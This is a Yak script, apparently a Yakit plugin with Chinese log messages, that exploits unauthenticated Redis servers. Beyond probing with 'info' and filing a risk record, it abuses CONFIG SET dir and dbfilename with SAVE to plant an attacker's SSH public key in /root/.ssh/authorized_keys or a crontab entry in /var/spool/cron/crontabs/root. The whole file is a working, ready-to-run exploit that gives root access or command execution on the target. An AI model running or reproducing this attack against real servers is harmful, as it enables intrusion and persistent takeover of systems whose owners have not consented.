yakit.AutoInitYakit()
log.setLevel("info")

target = cli.String("Target",cli.setRequired(true))
cli.check()
if target == "" {
    yakit.Error("Empty Target")
    return
}


port = cli.Int("Port", cli.setDefault(6379))
cli.check()
if port <= 0 {
    yakit.Error("Port is invalid")
    return
}


PublicKey = cli.String("PublicKey")
cli.check()
// writeCrontab = cli.Bool("writeCrontab")
Crontab = cli.String("Crontab")
cli.check()
passwd = cli.String("Password")
cli.check()

redispoc = func(target, port, conn) {
    conn.Send("info\r\n")
    result, err := conn.RecvStringTimeout(5)
    if str.MatchAllOfSubString(result, "redis_version:") {
        log.info("存在redis未授权访问")
        yakit.Info("存在redis未授权访问")
        risk.NewRisk(
            target, 
            risk.severity("low"),
            risk.title("redis未授权访问"),
            risk.description("因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据"),
            risk.solution("修改密码和端口，同时，建议在网络层面加强访问控制，只允许可信源访问"), 
            risk.type("unauth-access"),
            risk.payload(`info`),
            risk.details(result)
        )
        conn.Send("config set dir /root/.ssh/\r\n")
        result, err = conn.RecvStringTimeout(5)
        if result {
            yakit.Info(result)
        }
        if str.MatchAllOfSubString(result, "OK") {
            log.info("%v可以写入PublicKey", target)
            yakit.Info("%v可以写入PublicKey", target)
        } else {
            log.error("/root/.ssh/无权限")
            yakit.Error("/root/.ssh/无权限")
        }
        

        conn.Send("config set dir /var/spool/cron/crontabs\n")
        result, err = conn.RecvStringTimeout(5)
        if str.MatchAllOfSubString(result, "OK") {
            log.info("%v可以写入Crontab", target)
            yakit.Info("%v可以写入Crontab", target)
        } else {
            log.error("写入Crontab无权限")
            yakit.Error("写入Crontab无权限")
        }
        
    } else {
        log.error("不存在redis未授权访问,或者有密码")
        yakit.Error("不存在redis未授权访问,或者有密码")
    }
    
}

redisWriteCrontab = func(target, port, Crontab, conn) {
    conn.Send("config set dir /var/spool/cron/crontabs\n")
    result, err := conn.RecvStringTimeout(5)
    if str.MatchAllOfSubString(result, "OK") {
        log.info("设置目录成功")
        yakit.Info("设置目录成功")
        conn.Send("config set dbfilename root\r\n")
        result, err = conn.RecvStringTimeout(5)
        if str.MatchAllOfSubString(result, "OK") {
            log.info("设置dbfilename成功")
            yakit.Info("设置dbfilename成功")
            conn.Send(sprintf("set xx \"\\n%v\\n\"\r\n", Crontab))
            result, err = conn.RecvStringTimeout(5)
            if str.MatchAllOfSubString(result, "OK") {
                log.info("写入Crontab key成功")
                yakit.Info("写入Crontab key成功")
                conn.Send("save\r\n")
                result, err = conn.RecvStringTimeout(5)
                if str.MatchAllOfSubString(result, "OK") {
                    log.info("保存成功")
                    yakit.Info("保存成功")
                }
                
            }
            
        }
        
    } else {
        log.error("不存在redis未授权访问,或者有密码,或者/var/spool/cron/crontabs目录无写入权限")
        yakit.Error("不存在redis未授权访问,或者有密码,或者/var/spool/cron/crontabs目录无写入权限")
    }
    
}

redisWritePublicKey = func(target, port, PublicKey, conn) {
    conn.Send("CONFIG SET dir /root/.ssh\r\n")
    result, err := conn.RecvStringTimeout(5)
    if str.MatchAllOfSubString(result, "OK") {
        log.info("设置目录成功")
        yakit.Info("设置目录成功")
        conn.Send("CONFIG SET dbfilename authorized_keys\r\n")
        result, err = conn.RecvStringTimeout(5)
        if str.MatchAllOfSubString(result, "OK") {
            log.info("设置dbfilename成功")
            yakit.Info("设置dbfilename成功")
            conn.Send(sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", PublicKey))
            result, err = conn.RecvStringTimeout(5)
            if str.MatchAllOfSubString(result, "OK") {
                log.info("写入Public key成功")
                yakit.Info("写入Public key成功")
                conn.Send("save\r\n")
                result, err = conn.RecvStringTimeout(5)
                if str.MatchAllOfSubString(result, "OK") {
                    log.info("保存成功")
                    yakit.Info("保存成功")
                }
                
            }
            
        }
        
    } else {
        log.error("不存在redis未授权访问,或者有密码,或者目录/root/.ssh无写入权限")
        yakit.Error("不存在redis未授权访问,或者有密码,或者目录/root/.ssh无写入权限")
    }
    
}
switch cli {
case PublicKey != "":
    println("写入公钥到/root/.ssh目录")
    if passwd != "" {
        conn, err := tcp.Connect(target, port)
        if err != nil {
            yakit.Error("Connect to %v failed: %v", target, err)
        }
        

        die(err)
        conn.Send(sprintf("auth %v\r\n", passwd))
        result, err := conn.RecvStringTimeout(5)
        if err != nil {
            die(err)
        }
        if str.MatchAllOfSubString(result, "OK") {
            log.info("认证成功")
            yakit.Info("认证成功")
            redisWritePublicKey(target, port, PublicKey, conn)
        } else {
            log.error("认证失败,密码有误")
            yakit.Error("认证失败,密码有误")
        }
        
    } else {
        conn, err := tcp.Connect(target, port)
        if err != nil {
            yakit.Error("Connect to %v failed: %v", target, err)
        }
        

        die(err)
        redisWritePublicKey(target, port, PublicKey, conn)
    }
    
case Crontab != "":
    println("写入crontab任务至/var/spool/cron/crontabs")
    if passwd != "" {
        conn, err := tcp.Connect(target, port)
        if err != nil {
            yakit.Error("Connect to %v failed: %v", target, err)
        }
        

        die(err)
        conn.Send(sprintf("auth %v\r\n", passwd))
        result, err := conn.RecvStringTimeout(5)
        if err != nil {
            die(err)
        }
        if str.MatchAllOfSubString(result, "OK") {
            log.info("认证成功")
            yakit.Info("认证成功")
            redisWriteCrontab(target, port, Crontab, conn)
        } else {
            log.error("认证失败,密码有误")
            yakit.Error("认证失败,密码有误")
        }
        
    } else {
        conn, err := tcp.Connect(target, port)
        if err != nil {
            yakit.Error("Connect to %v failed: %v", target, err)
        }
        

        die(err)
        redisWriteCrontab(target, port, Crontab, conn)
    }
    
default:
    println("poc")
    if passwd != "" {
        conn, err := tcp.Connect(target, port)
        if err != nil {
            yakit.Error("Connect to %v failed: %v", target, err)
        }
        

        die(err)
        conn.Send(sprintf("auth %v\r\n", passwd))
        result, err := conn.RecvStringTimeout(5)
        if err != nil {
            die(err)
        }
        if str.MatchAllOfSubString(result, "OK") {
            log.info("认证成功")
            yakit.Info("认证成功")
            redispoc(target, port, conn)
        } else {
            log.error("认证失败,密码有误")
            yakit.Error("认证失败,密码有误")
        }
        
    } else {
        conn, err := tcp.Connect(target, port)
        if err != nil {
            yakit.Error("Connect to %v failed: %v", target, err)
        }
        

        die(err)
        redispoc(target, port, conn)
    }
    
}
